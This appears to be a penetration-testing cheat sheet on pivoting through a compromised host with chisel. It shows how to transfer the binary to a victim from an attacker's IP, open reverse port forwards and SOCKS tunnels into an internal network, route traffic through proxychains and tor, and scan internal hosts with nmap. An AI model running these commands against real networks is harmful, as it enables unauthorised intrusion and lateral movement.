## Server
Command to start reverse server in a specific port
```
./chisel server --reverse -p 1234
```

## Client
First you've to send the chisel binary:
```
python -m http.server {PORT}

wget http://{attacker's-IP}:{PORt}/chisel
```
OR
```
scp chisel root@{victim's-IP}:/tmp/chisel
```

### One way
Port forward a specific port to a stablished server (Remote port-forwarding)
```
./chisel client {attacker's-IP}:{Server-port} R:{PORT-TO-BRING}:{MACHINE-INSIDE-THE-NETWORK-WITH-PORT-OPEN}:{PORT-TO-OPEN-IN-ATTACKER's-MACHINE}
```

### The other way
Obtain access to all machines in the same network
```
./chisel client {attacker's-IP}:{Server-port} R:socks
```
Obtain access to all machines in the same network in an specific port
```
./chisel client {attacker's-IP}:{Server-port} R:{PORT}:socks
```

In this particular method you've to add the open port in our machine to the proxychains config
```
nano /etc/proxychains.conf
```
When only tunneling through one machine you've to enable "strict_chain" and deactivate "dynamic_chain".
```
#dynamic_chain
strict_chain

socks5 127.0.0.1 {PORT (1080 is default)}
```


## Things to have in mind
When running nmap through proxychains you've to use 2 parameters:
```
sudo proxychains nmap -sT -Pn
```
Usual nmap command:
```
sudo proxychains nmap -sT -Pn --top-ports 500 --open -T5 -v -n {IP 10.10.0.129 e.g.}
```

You've to run tor service:
```
service tor start
service tor status
service tor restart

sudo systemctl restart tor.service
```

## Tips
Port to know if a port is open
```
lsof -i:{PORT}
```

To run nmap in all ports in a quickly way you can
```
seq 1 65535 | xargs -P 500 -I {} sudo proxychains nmap -sT -T5 -Pn -p{} -open -v -n [IP] 2>&1 | grep "tcp open"
```